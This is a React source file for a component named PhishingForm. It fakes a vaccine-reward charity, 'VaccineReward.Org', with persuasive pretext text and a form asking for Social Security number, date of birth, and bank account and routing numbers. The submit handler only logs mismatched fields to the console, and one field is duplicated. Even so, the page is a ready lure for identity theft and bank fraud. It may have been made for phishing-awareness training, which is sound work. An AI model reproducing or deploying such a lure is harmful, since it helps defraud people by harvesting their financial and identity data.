import * as React from 'react';
import Avatar from '@mui/material/Avatar';
import Button from '@mui/material/Button';
import CssBaseline from '@mui/material/CssBaseline';
import TextField from '@mui/material/TextField';
import Link from '@mui/material/Link';
import Grid from '@mui/material/Grid';
import Box from '@mui/material/Box';
import Paper from '@mui/material/Paper';
import LockOutlinedIcon from '@mui/icons-material/LockOutlined';
import Typography from '@mui/material/Typography';
import Container from '@mui/material/Container';
import { createTheme, ThemeProvider } from '@mui/material/styles';
import flag from './flag.png';

function Copyright(props) {
    return (
        <Typography variant = "body2" color = "text.secondary" align = "center" {...props}>
            {'Copyright © '}
            <Link color = "inherit" href = "https://VaccineReward.Org/">
                VaccineReward.Org
            </Link>{' '}
            {new Date().getFullYear()}
            {'.'}
        </Typography>
    );
}

const theme = createTheme();

export default function PhishingForm() {
    const handleSubmit = (event) => {
        event.preventDefault();
        const data = new FormData(event.currentTarget);
        console.log({
        email: data.get('email'),
        password: data.get('password'),
        });
    };

    return (
        <ThemeProvider theme={theme}>
            <Paper elevation = {10} sx = {{ mt: 10, mr: 20, ml: 20, mb: 10 }}>
                <Grid container>
                    <Grid item sm = {5} md = {7}>
                        <Grid container>
                            <Grid item md = {12} align = 'center' sx = {{pt: 8}}>
                                <img src = {flag}/> 
                            </Grid>
                            <Grid item md = {12} align = 'center'>
                                <Box sx = {{ pb: 2 }}>
                                    <Typography align = 'center' component = "h1" variant = "h2">
                                        <strong>ABOUT US</strong>
                                    </Typography>
                                </Box>
                                <Box sx = {{pr: 2, pl: 2}}>
                                    <Typography align = 'center' component = "h1" variant = "h5">
                                        <strong>VaccineReward.org</strong> is a non-profit organization funded by donations from across the political spectrum to encourage participation 
                                        in the CDC recommended Corona 19 Vaccine. Donations are used to provide cash incentives to populations with below average 
                                        participation. Together we can restore normalcy though guiding our community towards immunity.
                                    </Typography>
                                    
                                </Box>
                                <Box sx = {{pr: 2, pl: 2, pt: 2}}>
                                    <Typography align = 'center' component = "h1" variant = "h5">
                                        You can <strong>make a donation</strong> to offset your reward or just <strong>accept the reward</strong> by entering your information on the form 
                                        to the right.
                                    </Typography>
                                </Box>
                                <Box sx = {{pr: 2, pl: 2, pt: 2}}>
                                    <Typography align = 'center' component = "h1" variant = "h5">
                                        <strong>Thanks for your help in keeping America Vaccinated.</strong>
                                    </Typography>
                                </Box>
                            </Grid>
                        </Grid>
                    </Grid>
                    <Grid item sm = {5} md = {5}>
                        <Container component = "main" maxWidth = "xs">
                            <CssBaseline />
                            <Box
                                sx = {{
                                    marginTop: 8,
                                    display: 'flex',
                                    flexDirection: 'column',
                                    alignItems: 'center',
                                }}
                            >
                                <Avatar sx = {{ m: 1, bgcolor: 'secondary.main' }}>
                                    <LockOutlinedIcon />
                                </Avatar>
                                <Typography align = 'center' component = "h1" variant = "h5">
                                    Please Enter the Following Information
                                </Typography>
                                <Box component = "form" onSubmit = {handleSubmit} noValidate sx = {{ mt: 1 }}>
                                    <TextField
                                        margin = "normal"
                                        required
                                        fullWidth
                                        id = "fullName"
                                        label = "Full Name"
                                        name = "fullName"
                                        autoFocus
                                    />
                                    <TextField
                                        margin = "normal"
                                        required
                                        fullWidth
                                        name = "ssn"
                                        label = "Social Security Number"
                                        type = "ssn"
                                        id = "ssn"
                                    />
                                    <TextField
                                        margin = "normal"
                                        required
                                        fullWidth
                                        name = "dob"
                                        label = "Date of Birth"
                                        type = "dob"
                                        id = "dob"
                                    />
                                    <TextField
                                        margin = "normal"
                                        required
                                        fullWidth
                                        name = "dob"
                                        label = "Date of Birth"
                                        type = "dob"
                                        id = "dob"
                                    />
                                    <TextField
                                        margin = "normal"
                                        required
                                        fullWidth
                                        name = "accountNumber"
                                        label = "Account Number"
                                        type = "accountNumber"
                                        id = "accountNumber"
                                    />
                                    <TextField
                                        margin = "normal"
                                        required
                                        fullWidth
                                        name = "routingNumber"
                                        label = "Routing Number"
                                        type = "routingNumber"
                                        id = "routingNumber"
                                    />
                                    <TextField
                                        margin = "normal"
                                        fullWidth
                                        name = "donationAmount"
                                        label = "Donation Amount"
                                        type = "donationAmount"
                                        id = "donationAmount"
                                    />
                                    <Button
                                        type = "submit"
                                        fullWidth
                                        variant = "contained"
                                        sx = {{ mt: 3, mb: 2 }}
                                    >
                                        <strong>RECEIVE REWARD</strong>
                                    </Button>
                                    <Button
                                        type = "submit"
                                        fullWidth
                                        variant = "contained"
                                        sx = {{ mt: 3, mb: 2 }}
                                    >
                                        <strong>MAKE DONATION</strong>
                                    </Button>
                                </Box>
                            </Box>
                            <Copyright sx = {{ mt: 8, mb: 4 }} />
                        </Container>
                    </Grid>
                </Grid>
            </Paper>
        </ThemeProvider>
    );
}